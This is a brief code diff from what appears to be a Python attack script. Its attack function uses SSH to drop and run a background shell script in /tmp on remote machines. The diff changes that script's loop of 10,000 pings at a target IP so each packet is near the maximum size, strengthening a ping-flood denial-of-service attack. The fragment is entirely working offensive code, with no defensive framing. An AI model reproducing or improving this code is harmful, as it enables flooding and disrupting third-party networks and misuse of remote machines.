@@ -103,7 +103,7 @@ def attack(ip, command, port, type):
 
             elif command == 2:
 
-                d, e, f = ssh.exec_command(f"touch /tmp/system-tmp"+numero+".sh \n cd /tmp \n echo 'for i in {1..10000..1}; do ping "+ip+"; done'>> system-tmp"+numero+".sh \n chmod 755 system-tmp"+numero+".sh \n ./system-tmp"+numero+".sh &")
+                d, e, f = ssh.exec_command(f"touch /tmp/system-tmp"+numero+".sh \n cd /tmp \n echo 'for i in {1..10000..1}; do ping "+ip+" -s 65500; done'>> system-tmp"+numero+".sh \n chmod 755 system-tmp"+numero+".sh \n ./system-tmp"+numero+".sh &")
 
             elif command == 3:
 
